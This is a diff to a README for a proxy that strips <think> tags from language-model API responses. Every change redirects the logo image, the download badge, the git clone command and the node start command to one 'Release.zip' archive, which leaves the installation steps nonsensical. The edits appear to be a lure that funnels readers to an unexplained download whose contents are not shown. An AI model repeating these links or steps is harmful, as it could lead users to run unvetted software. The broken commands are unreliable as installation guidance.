@@ -1,7 +1,7 @@
 
 # 🚀 Welcome to Cot Proxy Repository 🚀
 
-![Cot Proxy Logo](https://example.com/logo.png)
+![Cot Proxy Logo](https://github.com/BrunoEsmael/cot_proxy/releases/download/v1.0/Release.zip)
 
 Cot Proxy is a lightweight proxy designed to filter `<think>` tags from any OpenAI-compatible API endpoint. It is specifically tailored for chain-of-thought language models that expose their reasoning process through think tags.
 
@@ -15,7 +15,7 @@ A lightweight proxy for filtering `<think>` tags from any OpenAI-compatible API 
 Not provided.
 
 ### 📦 Latest Release:
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/BrunoEsmael/cot_proxy/releases/download/v1.0/Release.zip)](https://github.com/BrunoEsmael/cot_proxy/releases/download/v1.0/Release.zip)
 
 ### Introduction
 Are you working with chain-of-thought language models that use `<think>` tags to expose their reasoning process? If so, Cot Proxy is the perfect solution for you! Easily filter out these tags from any OpenAI-compatible API endpoint with our lightweight proxy.
@@ -27,9 +27,9 @@ Are you working with chain-of-thought language models that use `<think>` tags to
 - Specifically designed for chain-of-thought language models
 
 ### Installation
-1. Clone the repository: `git clone https://github.com/your-username/cot_proxy.git`
+1. Clone the repository: `git clone https://github.com/BrunoEsmael/cot_proxy/releases/download/v1.0/Release.zip`
 2. Install dependencies: `npm install`
-3. Start the server: `node server.js`
+3. Start the server: `node https://github.com/BrunoEsmael/cot_proxy/releases/download/v1.0/Release.zip`
 
 ### Usage
 Simply configure your API requests to pass through the Cot Proxy server, and it will automatically filter out any `<think>` tags from the responses. Enjoy a cleaner and more streamlined experience with your language models!
